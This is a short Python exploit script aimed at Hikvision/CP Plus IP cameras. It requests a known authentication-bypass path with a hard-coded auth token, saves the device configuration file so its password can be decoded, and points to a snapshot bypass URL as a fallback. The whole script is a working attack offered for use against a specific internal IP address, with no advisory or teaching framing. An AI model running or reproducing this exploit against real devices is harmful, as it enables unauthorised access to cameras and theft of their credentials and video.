import requests

ip = "172.16.1.34"
# This is the "Magic Path" that bypasses security on many Hikvision/CP Plus units
url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"

print(f"[*] Attempting to bypass password and snatch the config file...")

try:
    response = requests.get(url, timeout=5, stream=True)
    
    if response.status_code == 200:
        print("[!!] BYPASS SUCCESSFUL!")
        with open("config_dump.bin", "wb") as f:
            f.write(response.content)
        print("[*] Configuration file saved as 'config_dump.bin'.")
        print("[*] Now we just need to decode it to see the password.")
    else:
        print(f"[-] Bypass failed (Status {response.status_code}). Firmware is likely patched.")
        print("[*] Try the Snapshot bypass next: http://172.16.1.34/onvif-http/snapshot?auth=YWRtaW46MTEK")

except Exception as e:
    print(f"[-] Error: {e}")